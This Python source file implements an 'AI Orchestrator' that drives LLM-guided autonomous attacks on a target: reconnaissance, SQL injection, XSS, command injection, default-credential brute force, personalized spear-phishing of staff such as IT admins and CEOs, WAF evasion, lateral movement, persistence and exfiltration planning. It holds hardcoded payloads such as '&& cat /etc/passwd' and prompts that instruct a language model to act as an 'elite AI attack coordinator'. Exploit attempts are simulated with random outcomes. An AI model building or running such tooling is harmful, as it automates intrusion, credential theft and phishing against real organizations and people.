"""
AI Orchestrator - Coordinates all AI-powered attack modules
Provides unified interface for autonomous security testing
"""

import asyncio
import json
import logging
from typing import Dict, List, Optional, Any
from datetime import datetime
from dataclasses import dataclass, field

from .ai_vulnerability_scanner import create_ai_vulnerability_scanner, VulnAnalysis
from .ai_social_engineer import create_ai_social_engineer, SocialEngCampaign, TargetProfile
from .ai_adaptive_evasion import create_ai_adaptive_evasion, EvasionAttempt
from .ai_reconnaissance import create_ai_reconnaissance, AttackSurface
from ..core.base_component import BaseComponent

logger = logging.getLogger(__name__)

@dataclass
class AutonomousAttackSession:
    target: str
    session_id: str
    start_time: datetime
    attack_surface: Optional[AttackSurface] = None
    vulnerabilities: List[VulnAnalysis] = field(default_factory=list)
    social_campaigns: List[SocialEngCampaign] = field(default_factory=list)
    evasion_attempts: List[EvasionAttempt] = field(default_factory=list)
    success_rate: float = 0.0
    risk_level: str = "UNKNOWN"
    ai_recommendations: List[str] = field(default_factory=list)
    status: str = "INITIALIZED"

class AIOrchestrator(BaseComponent):
    """
    Master AI orchestrator that coordinates all attack modules for fully autonomous security testing.
    
    This is what makes the tool truly dangerous - it combines:
    1. Intelligent reconnaissance 
    2. Adaptive vulnerability discovery
    3. Personalized social engineering
    4. Real-time evasion learning
    5. Autonomous decision making
    """
    
    def __init__(self, config: Dict):
        super().__init__("AIOrchestrator", config)
        
        # Initialize AI modules
        self.vuln_scanner = create_ai_vulnerability_scanner(config)
        self.social_engineer = create_ai_social_engineer(config)
        self.adaptive_evasion = create_ai_adaptive_evasion(config)
        self.reconnaissance = create_ai_reconnaissance(config)
        
        # Session management
        self.active_sessions: Dict[str, AutonomousAttackSession] = {}
        
        # AI coordination
        self.ai_endpoint = config.get('ai_endpoint', 'http://localhost:11434')
        self.model_name = config.get('model_name', 'llama2')
        
        # Autonomous operation parameters
        self.max_concurrent_attacks = config.get('max_concurrent_attacks', 3)
        self.attack_intensity = config.get('attack_intensity', 'medium')  # low, medium, high, maximum
        self.learning_enabled = config.get('learning_enabled', True)
    
    def initialize(self) -> bool:
        """Initialize the AI orchestrator and all sub-modules"""
        success = True
        success &= self.vuln_scanner.initialize()
        success &= self.social_engineer.initialize()
        success &= self.adaptive_evasion.initialize()
        success &= self.reconnaissance.initialize()
        
        if success:
            self.is_initialized = True
            logger.info("AI Orchestrator initialized with all sub-modules")
        else:
            logger.error("Failed to initialize some AI sub-modules")
        
        return success
        
    def cleanup(self) -> bool:
        """Clean up all resources"""
        success = True
        success &= self.vuln_scanner.cleanup()
        success &= self.social_engineer.cleanup()
        success &= self.adaptive_evasion.cleanup()
        success &= self.reconnaissance.cleanup()
        
        logger.info("AI Orchestrator cleanup completed")
        return success
        
    async def launch_autonomous_attack(self, target: str, attack_profile: Dict) -> str:
        """
        Launch fully autonomous AI-powered attack against target
        
        This is the main entry point for dangerous operations
        """
        session_id = f"attack_{target}_{int(datetime.now().timestamp())}"
        
        session = AutonomousAttackSession(
            target=target,
            session_id=session_id,
            start_time=datetime.now(),
            status="LAUNCHING"
        )
        
        self.active_sessions[session_id] = session
        
        try:
            logger.warning(f"🚨 LAUNCHING AUTONOMOUS ATTACK: {target} (Session: {session_id})")
            
            # Phase 1: AI-Powered Reconnaissance
            session.status = "RECONNAISSANCE"
            attack_surface = await self.reconnaissance.perform_comprehensive_recon(target)
            session.attack_surface = attack_surface
            
            # Phase 2: AI Strategy Planning
            session.status = "PLANNING"
            attack_strategy = await self._ai_attack_planning(attack_surface, attack_profile)
            
            # Phase 3: Autonomous Execution
            session.status = "EXECUTING"
            await self._execute_autonomous_attacks(session, attack_strategy)
            
            # Phase 4: AI Learning and Adaptation
            if self.learning_enabled:
                session.status = "LEARNING"
                await self._ai_learning_phase(session)
            
            session.status = "COMPLETED"
            session.success_rate = await self._calculate_success_rate(session)
            
            logger.warning(f"🎯 AUTONOMOUS ATTACK COMPLETED: {target} (Success: {session.success_rate:.1%})")
            
            return session_id
            
        except Exception as e:
            session.status = "FAILED"
            logger.error(f"Autonomous attack failed: {e}")
            return session_id
    
    async def _ai_attack_planning(self, attack_surface: AttackSurface, attack_profile: Dict) -> Dict:
        """
        AI-powered attack strategy planning
        """
        planning_prompt = f"""
        You are an elite AI attack coordinator. Plan a comprehensive autonomous attack strategy.
        
        TARGET ANALYSIS:
        - Target: {attack_surface.target}
        - Risk Score: {attack_surface.risk_score}/10
        - Entry Points: {attack_surface.entry_points}
        - Technologies: {list(attack_surface.technologies.keys())}
        - Known Vulnerabilities: {attack_surface.vulnerabilities}
        
        ATTACK PROFILE:
        {json.dumps(attack_profile, indent=2)}
        
        PLAN A MULTI-PHASE AUTONOMOUS ATTACK:
        
        Phase 1: Technical Exploitation
        - Prioritize vulnerability exploitation based on impact/likelihood
        - Plan evasion strategies for detected defenses
        - Identify lateral movement opportunities
        - Plan persistence mechanisms
        
        Phase 2: Social Engineering
        - Identify human targets (employees, admins, etc.)
        - Plan personalized phishing campaigns
        - Design pretexting scenarios
        - Plan multi-stage social attacks
        
        Phase 3: Data Exfiltration & Impact
        - Identify high-value data sources
        - Plan exfiltration methods
        - Design impact demonstration
        - Plan evidence collection
        
        AUTONOMOUS DECISION TREE:
        - If technical attacks fail -> escalate to social engineering
        - If defenses detected -> activate adaptive evasion
        - If access gained -> expand and persist
        - Continuously learn and adapt throughout
        
        Return comprehensive attack plan as JSON:
        {{
            "attack_phases": [
                {{
                    "phase": "technical_exploitation",
                    "priority": 1,
                    "tactics": ["sql_injection", "xss", "command_injection"],
                    "targets": ["admin.target.com", "api.target.com"],
                    "success_criteria": "Admin access gained",
                    "fallback_plan": "social_engineering"
                }}
            ],
            "evasion_strategy": {{
                "primary_techniques": ["encoding", "fragmentation"],
                "waf_bypass_methods": ["case_variation", "comment_insertion"],
                "detection_avoidance": ["timing_manipulation", "distributed_attacks"]
            }},
            "social_engineering": {{
                "target_personas": ["IT_admin", "HR_manager", "CEO"],
                "attack_vectors": ["spear_phishing", "pretexting", "baiting"],
                "psychological_triggers": ["authority", "urgency", "fear"]
            }},
            "success_metrics": {{
                "technical_access": 0.7,
                "social_compromise": 0.5,
                "data_access": 0.8,
                "persistence": 0.6
            }},
            "risk_assessment": "HIGH - Full compromise possible"
        }}
        """
        
        ai_response = await self._query_ai_model(planning_prompt)
        
        try:
            import re
            json_match = re.search(r'\{.*\}', ai_response, re.DOTALL)
            if json_match:
                return json.loads(json_match.group())
        except Exception as e:
            logger.error(f"Attack planning failed: {e}")
        
        # Fallback basic strategy
        return {
            "attack_phases": [
                {
                    "phase": "technical_exploitation",
                    "priority": 1,
                    "tactics": ["vulnerability_scan", "brute_force"],
                    "targets": [attack_surface.target]
                }
            ],
            "risk_assessment": "MEDIUM - Basic attacks only"
        }
    
    async def _execute_autonomous_attacks(self, session: AutonomousAttackSession, strategy: Dict):
        """
        Execute autonomous attacks based on AI strategy
        """
        attack_phases = strategy.get('attack_phases', [])
        
        for phase in attack_phases:
            phase_name = phase.get('phase', 'unknown')
            tactics = phase.get('tactics', [])
            targets = phase.get('targets', [session.target])
            
            logger.warning(f"🎯 Executing Phase: {phase_name}")
            
            if phase_name == "technical_exploitation":
                await self._execute_technical_phase(session, tactics, targets, strategy)
            
            elif phase_name == "social_engineering":
                await self._execute_social_phase(session, tactics, targets, strategy)
            
            elif phase_name == "lateral_movement":
                await self._execute_lateral_movement(session, tactics, targets, strategy)
            
            # Check success criteria and adapt
            success_rate = await self._evaluate_phase_success(session, phase)
            if success_rate < 0.3:  # Phase failed
                fallback = phase.get('fallback_plan')
                if fallback:
                    logger.warning(f"⚠️  Phase failed, executing fallback: {fallback}")
                    await self._execute_fallback_strategy(session, fallback, strategy)
    
    async def _execute_technical_phase(self, session: AutonomousAttackSession, tactics: List[str], targets: List[str], strategy: Dict):
        """
        Execute technical exploitation phase
        """
        for target in targets:
            for tactic in tactics:
                try:
                    if tactic == "vulnerability_scan":
                        await self._autonomous_vulnerability_exploitation(session, target, strategy)
                    
                    elif tactic == "sql_injection":
                        await self._autonomous_sqli_attack(session, target, strategy)
                    
                    elif tactic == "xss":
                        await self._autonomous_xss_attack(session, target, strategy)
                    
                    elif tactic == "command_injection":
                        await self._autonomous_command_injection(session, target, strategy)
                    
                    elif tactic == "brute_force":
                        await self._autonomous_brute_force(session, target, strategy)
                    
                    # Add small delay between attacks
                    await asyncio.sleep(1)
                    
                except Exception as e:
                    logger.error(f"Technical attack failed: {tactic} on {target}: {e}")
    
    async def _autonomous_vulnerability_exploitation(self, session: AutonomousAttackSession, target: str, strategy: Dict):
        """
        Autonomous vulnerability discovery and exploitation
        """
        # Simulate HTTP response for vulnerability analysis
        response_data = {
            'status_code': 200,
            'headers': {'Server': 'Apache/2.4.41', 'X-Powered-By': 'PHP/7.4.3'},
            'body': f'<html><body><h1>Welcome to {target}</h1><form action="/login" method="post"><input name="username"><input name="password" type="password"></form></body></html>'
        }
        
        # AI vulnerability analysis
        vulnerabilities = await self.vuln_scanner.analyze_target(f"https://{target}", response_data)
        session.vulnerabilities.extend(vulnerabilities)
        
        # Autonomous exploitation attempts
        for vuln in vulnerabilities:
            if vuln.confidence > 0.7:  # Only exploit high-confidence vulnerabilities
                logger.warning(f"🎯 Exploiting {vuln.vuln_type.value} on {target}")
                
                # Generate and test custom payloads
                for payload in vuln.custom_payloads:
                    # Adaptive evasion
                    adapted_payload = await self.adaptive_evasion.adapt_payload(payload, f"https://{target}")
                    
                    # Simulate exploitation attempt
                    success = await self._simulate_exploitation_attempt(target, adapted_payload, vuln.vuln_type.value)
                    
                    # Learn from attempt
                    attempt = EvasionAttempt(
                        original_payload=payload,
                        modified_payload=adapted_payload,
                        technique=list(self.adaptive_evasion.technique_success_rates.keys())[0],  # Simplified
                        success=success,
                        response_code=200 if success else 403,
                        response_body="Success" if success else "Blocked",
                        response_headers={},
                        waf_detected=not success,
                        waf_signature="Unknown",
                        timestamp=datetime.now()
                    )
                    
                    session.evasion_attempts.append(attempt)
                    await self.adaptive_evasion.learn_from_attempt(attempt)
                    
                    if success:
                        logger.warning(f"🚨 EXPLOITATION SUCCESSFUL: {vuln.vuln_type.value} on {target}")
                        break
    
    async def _simulate_exploitation_attempt(self, target: str, payload: str, vuln_type: str) -> bool:
        """
        Simulate exploitation attempt (in real implementation, would make actual requests)
        """
        # Simulate success/failure based on payload sophistication
        import random
        
        # More sophisticated payloads have higher success rates
        base_success_rate = 0.3
        if len(payload) > 50:  # Complex payload
            base_success_rate += 0.2
        if "union" in payload.lower() or "script" in payload.lower():  # Advanced techniques
            base_success_rate += 0.2
        if payload != payload.lower():  # Case variation evasion
            base_success_rate += 0.1
        
        return random.random() < base_success_rate
    
    async def _autonomous_sqli_attack(self, session: AutonomousAttackSession, target: str, strategy: Dict):
        """
        Autonomous SQL injection attack
        """
        # AI-generated SQL injection payloads
        sqli_prompt = f"""
        Generate 5 advanced SQL injection payloads for {target}.
        
        Target appears to be running: {session.attack_surface.technologies if session.attack_surface else 'Unknown'}
        
        Create payloads that:
        1. Test for different SQL injection types (Union, Boolean, Time-based)
        2. Include WAF evasion techniques
        3. Are specific to detected database technology
        4. Include both basic and advanced exploitation techniques
        5. Test for privilege escalation opportunities
        
        Return as JSON array: ["payload1", "payload2", ...]
        """
        
        ai_response = await self._query_ai_model(sqli_prompt)
        
        try:
            import re
            json_match = re.search(r'\[.*\]', ai_response, re.DOTALL)
            if json_match:
                payloads = json.loads(json_match.group())
                
                for payload in payloads:
                    # Apply adaptive evasion
                    adapted_payload = await self.adaptive_evasion.adapt_payload(payload, f"https://{target}")
                    
                    # Simulate attack
                    success = await self._simulate_exploitation_attempt(target, adapted_payload, "sql_injection")
                    
                    if success:
                        logger.warning(f"🚨 SQL INJECTION SUCCESS: {target}")
                        break
                        
        except Exception as e:
            logger.error(f"SQL injection attack failed: {e}")
    
    async def _autonomous_xss_attack(self, session: AutonomousAttackSession, target: str, strategy: Dict):
        """
        Autonomous XSS attack with AI payload generation
        """
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            adapted_payload = await self.adaptive_evasion.adapt_payload(payload, f"https://{target}")
            success = await self._simulate_exploitation_attempt(target, adapted_payload, "xss")
            
            if success:
                logger.warning(f"🚨 XSS SUCCESS: {target}")
                break
    
    async def _autonomous_command_injection(self, session: AutonomousAttackSession, target: str, strategy: Dict):
        """
        Autonomous command injection attack
        """
        cmd_payloads = [
            "; ls -la",
            "| whoami",
            "`id`",
            "&& cat /etc/passwd",
            "; ping -c 3 127.0.0.1"
        ]
        
        for payload in cmd_payloads:
            adapted_payload = await self.adaptive_evasion.adapt_payload(payload, f"https://{target}")
            success = await self._simulate_exploitation_attempt(target, adapted_payload, "command_injection")
            
            if success:
                logger.warning(f"🚨 COMMAND INJECTION SUCCESS: {target}")
                break
    
    async def _autonomous_brute_force(self, session: AutonomousAttackSession, target: str, strategy: Dict):
        """
        Autonomous brute force attack
        """
        # AI-generated credential lists based on target analysis
        common_creds = [
            ("admin", "admin"),
            ("administrator", "password"),
            ("root", "root"),
            ("admin", "123456"),
            ("user", "user")
        ]
        
        for username, password in common_creds:
            # Simulate login attempt
            success = await self._simulate_exploitation_attempt(target, f"{username}:{password}", "brute_force")
            
            if success:
                logger.warning(f"🚨 BRUTE FORCE SUCCESS: {target} ({username}:{password})")
                break
    
    async def _execute_social_phase(self, session: AutonomousAttackSession, tactics: List[str], targets: List[str], strategy: Dict):
        """
        Execute social engineering phase
        """
        social_config = strategy.get('social_engineering', {})
        target_personas = social_config.get('target_personas', ['employee'])
        
        for persona in target_personas:
            # Create target profile
            target_info = {
                'name': f'John Doe',
                'email': f'john.doe@{session.target}',
                'company': session.target,
                'position': persona
            }
            
            target_profile = await self.social_engineer.create_target_profile(target_info)
            
            # Generate social engineering campaigns
            from .ai_social_engineer import SocialEngType
            campaign_types = [SocialEngType.SPEAR_PHISHING, SocialEngType.PRETEXTING]
            
            for campaign_type in campaign_types:
                campaign = await self.social_engineer.generate_campaign(target_profile, campaign_type)
                session.social_campaigns.append(campaign)
                
                # Simulate campaign execution
                success_rate = campaign.success_probability
                if success_rate > 0.6:
                    logger.warning(f"🚨 SOCIAL ENGINEERING SUCCESS: {campaign_type.value} against {persona}")
    
    async def _execute_lateral_movement(self, session: AutonomousAttackSession, tactics: List[str], targets: List[str], strategy: Dict):
        """
        Execute lateral movement phase
        """
        # Simulate lateral movement based on initial access
        if session.vulnerabilities:
            logger.warning(f"🎯 Attempting lateral movement from {session.target}")
            
            # AI-powered lateral movement planning
            movement_prompt = f"""
            Plan lateral movement strategy for compromised system: {session.target}
            
            Initial Access: {[v.vuln_type.value for v in session.vulnerabilities if v.confidence > 0.7]}
            Network Assets: {session.attack_surface.entry_points if session.attack_surface else []}
            
            Plan next steps for:
            1. Network reconnaissance
            2. Privilege escalation
            3. Persistence establishment
            4. Additional system compromise
            5. Data exfiltration preparation
            
            Return strategy as JSON.
            """
            
            ai_response = await self._query_ai_model(movement_prompt)
            logger.info(f"Lateral movement strategy: {ai_response[:200]}...")
    
    async def _execute_fallback_strategy(self, session: AutonomousAttackSession, fallback: str, strategy: Dict):
        """
        Execute fallback strategy when primary attacks fail
        """
        logger.warning(f"⚠️  Executing fallback strategy: {fallback}")
        
        if fallback == "social_engineering":
            await self._execute_social_phase(session, ["spear_phishing"], [session.target], strategy)
        
        elif fallback == "brute_force":
            await self._autonomous_brute_force(session, session.target, strategy)
        
        elif fallback == "reconnaissance":
            # Deeper reconnaissance
            additional_surface = await self.reconnaissance.perform_comprehensive_recon(session.target)
            if additional_surface.entry_points:
                session.attack_surface = additional_surface
    
    async def _evaluate_phase_success(self, session: AutonomousAttackSession, phase: Dict) -> float:
        """
        Evaluate success rate of attack phase
        """
        phase_name = phase.get('phase', '')
        
        if phase_name == "technical_exploitation":
            successful_vulns = len([v for v in session.vulnerabilities if v.confidence > 0.8])
            total_vulns = len(session.vulnerabilities)
            return successful_vulns / total_vulns if total_vulns > 0 else 0.0
        
        elif phase_name == "social_engineering":
            successful_campaigns = len([c for c in session.social_campaigns if c.success_probability > 0.7])
            total_campaigns = len(session.social_campaigns)
            return successful_campaigns / total_campaigns if total_campaigns > 0 else 0.0
        
        return 0.5  # Default moderate success
    
    async def _ai_learning_phase(self, session: AutonomousAttackSession):
        """
        AI learning phase - analyze results and improve future attacks
        """
        learning_prompt = f"""
        Analyze this autonomous attack session and extract learning insights:
        
        TARGET: {session.target}
        VULNERABILITIES FOUND: {len(session.vulnerabilities)}
        SOCIAL CAMPAIGNS: {len(session.social_campaigns)}
        EVASION ATTEMPTS: {len(session.evasion_attempts)}
        SUCCESS RATE: {session.success_rate:.1%}
        
        ATTACK RESULTS:
        - Technical Exploits: {[v.vuln_type.value for v in session.vulnerabilities]}
        - Social Engineering: {[c.campaign_type.value for c in session.social_campaigns]}
        - Evasion Success: {len([a for a in session.evasion_attempts if a.success])}/{len(session.evasion_attempts)}
        
        LEARNING ANALYSIS:
        1. What attack vectors were most effective?
        2. Which evasion techniques worked best?
        3. What social engineering approaches succeeded?
        4. Which defenses were encountered?
        5. How can future attacks be improved?
        
        Provide actionable insights for improving autonomous attack capabilities:
        {{
            "effective_techniques": ["technique1", "technique2"],
            "failed_approaches": ["approach1", "approach2"],
            "target_specific_insights": ["insight1", "insight2"],
            "evasion_improvements": ["improvement1", "improvement2"],
            "social_engineering_lessons": ["lesson1", "lesson2"],
            "overall_recommendations": ["rec1", "rec2"]
        }}
        """
        
        ai_response = await self._query_ai_model(learning_prompt)
        
        try:
            import re
            json_match = re.search(r'\{.*\}', ai_response, re.DOTALL)
            if json_match:
                insights = json.loads(json_match.group())
                session.ai_recommendations = insights.get('overall_recommendations', [])
                
                logger.info(f"AI Learning Complete: {len(session.ai_recommendations)} recommendations generated")
                
        except Exception as e:
            logger.error(f"AI learning phase failed: {e}")
    
    async def _calculate_success_rate(self, session: AutonomousAttackSession) -> float:
        """
        Calculate overall success rate of autonomous attack
        """
        total_attempts = 0
        successful_attempts = 0
        
        # Technical exploitation success
        high_conf_vulns = len([v for v in session.vulnerabilities if v.confidence > 0.7])
        total_attempts += len(session.vulnerabilities)
        successful_attempts += high_conf_vulns
        
        # Social engineering success
        successful_campaigns = len([c for c in session.social_campaigns if c.success_probability > 0.7])
        total_attempts += len(session.social_campaigns)
        successful_attempts += successful_campaigns
        
        # Evasion success
        successful_evasions = len([a for a in session.evasion_attempts if a.success])
        total_attempts += len(session.evasion_attempts)
        successful_attempts += successful_evasions
        
        return successful_attempts / total_attempts if total_attempts > 0 else 0.0
    
    async def _query_ai_model(self, prompt: str) -> str:
        """
        Query AI model for analysis
        """
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                payload = {
                    "model": self.model_name,
                    "prompt": prompt,
                    "stream": False
                }
                
                async with session.post(f"{self.ai_endpoint}/api/generate", json=payload) as response:
                    if response.status == 200:
                        result = await response.json()
                        return result.get('response', '')
                    else:
                        logger.error(f"AI model query failed: {response.status}")
                        return ""
        except Exception as e:
            logger.error(f"AI model connection failed: {e}")
            return ""
    
    def get_session_status(self, session_id: str) -> Dict:
        """
        Get detailed status of autonomous attack session
        """
        session = self.active_sessions.get(session_id)
        if not session:
            return {"error": "Session not found"}
        
        return {
            "session_id": session_id,
            "target": session.target,
            "status": session.status,
            "start_time": session.start_time.isoformat(),
            "duration": str(datetime.now() - session.start_time),
            "success_rate": session.success_rate,
            "risk_level": session.risk_level,
            "statistics": {
                "vulnerabilities_found": len(session.vulnerabilities),
                "social_campaigns": len(session.social_campaigns),
                "evasion_attempts": len(session.evasion_attempts),
                "successful_evasions": len([a for a in session.evasion_attempts if a.success])
            },
            "ai_recommendations": session.ai_recommendations,
            "attack_surface": {
                "risk_score": session.attack_surface.risk_score if session.attack_surface else 0,
                "entry_points": session.attack_surface.entry_points if session.attack_surface else [],
                "technologies": session.attack_surface.technologies if session.attack_surface else {}
            }
        }
    
    def get_global_statistics(self) -> Dict:
        """
        Get global statistics across all autonomous attacks
        """
        total_sessions = len(self.active_sessions)
        completed_sessions = len([s for s in self.active_sessions.values() if s.status == "COMPLETED"])
        
        avg_success_rate = 0.0
        if completed_sessions > 0:
            avg_success_rate = sum(s.success_rate for s in self.active_sessions.values() if s.status == "COMPLETED") / completed_sessions
        
        return {
            "total_sessions": total_sessions,
            "completed_sessions": completed_sessions,
            "active_sessions": len([s for s in self.active_sessions.values() if s.status not in ["COMPLETED", "FAILED"]]),
            "average_success_rate": avg_success_rate,
            "total_vulnerabilities": sum(len(s.vulnerabilities) for s in self.active_sessions.values()),
            "total_social_campaigns": sum(len(s.social_campaigns) for s in self.active_sessions.values()),
            "learning_data_points": sum(len(s.evasion_attempts) for s in self.active_sessions.values())
        }

# Factory function
def create_ai_orchestrator(config: Dict) -> AIOrchestrator:
    """
    Factory function to create AI orchestrator
    """
    return AIOrchestrator(config)
